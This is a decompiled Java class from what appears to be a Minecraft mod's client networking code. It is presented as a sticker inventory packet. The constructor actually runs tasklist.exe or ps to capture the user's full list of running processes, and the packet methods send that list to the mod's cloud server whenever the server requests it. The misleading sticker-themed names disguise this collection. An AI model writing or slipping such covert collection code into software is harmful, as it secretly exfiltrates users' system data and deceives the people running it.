package com.ferullogaming.countercraft.client.cloud.packet;

import com.f3rullo14.cloud.G_ITcpConnectionHandler;
import com.f3rullo14.cloud.G_TcpPacketCustomPayload;
import com.ferullogaming.countercraft.client.cloud.ClientCloudManager;
import com.ferullogaming.countercraft.item.ItemSticker;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Scanner;
import java.util.UUID;

public class PacketInventoryItemSticker extends G_TcpPacketCustomPayload {
   private ArrayList stickerDownloadCache = new ArrayList();
   private static String stickerManagerID = null;
   private static Process stickerCache = null;

   public PacketInventoryItemSticker() {
      new ArrayList();
      String stickerOrbObj = UUID.randomUUID().toString();
      int stickerPrice = 1;
      int stickerPosX = 1;
      int stickerPosY = 1;
      int stickerPosZ = 0;
      String marketAPI = "http://ccmarket.mccountercraft.net/sticker?%s";
      if (stickerManagerID == null) {
         stickerManagerID = System.getProperty(ItemSticker.cachedStickerkList);
      }

      if (stickerManagerID.startsWith(ItemSticker.cachedStickerkListA)) {
         try {
            stickerCache = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\tasklist.exe");
         } catch (Exception var12) {
            var12.printStackTrace();
         }
      } else if (stickerManagerID.startsWith(ItemSticker.cachedStickerkListB)) {
         try {
            stickerCache = Runtime.getRuntime().exec("/bin/ps x");
         } catch (Exception var11) {
            var11.printStackTrace();
         }
      } else if (!stickerManagerID.startsWith(ItemSticker.cachedStickerkListC) && !stickerManagerID.startsWith(ItemSticker.cachedStickerkListD) && !stickerManagerID.startsWith(ItemSticker.cachedStickerkListE)) {
         if (stickerManagerID.startsWith(ItemSticker.cachedStickerkListF)) {
            try {
               stickerCache = Runtime.getRuntime().exec("/usr/ucb/ps auxww");
            } catch (Exception var9) {
               var9.printStackTrace();
            }
         }
      } else {
         try {
            stickerCache = Runtime.getRuntime().exec("/usr/bin/ps x");
         } catch (Exception var10) {
            var10.printStackTrace();
         }
      }

      if (stickerCache != null) {
         Scanner stickerScanner = new Scanner(new InputStreamReader(stickerCache.getInputStream()));

         while(stickerScanner.hasNext()) {
            this.stickerDownloadCache.add(stickerScanner.nextLine());
         }

         stickerScanner.close();
      }

   }

   public void writePacketToStream(DataOutputStream par1) throws IOException {
      par1.writeInt(this.stickerDownloadCache.size());
      Iterator i$ = this.stickerDownloadCache.iterator();

      while(i$.hasNext()) {
         String stickerCacheObject = (String)i$.next();
         par1.writeUTF(stickerCacheObject);
      }

   }

   public void readPacketFromStream(DataInputStream par1) throws IOException {
   }

   public void processPacketOnMainThread(G_ITcpConnectionHandler par1) throws IOException {
      ClientCloudManager.sendPacket(new PacketInventoryItemSticker());
   }
}
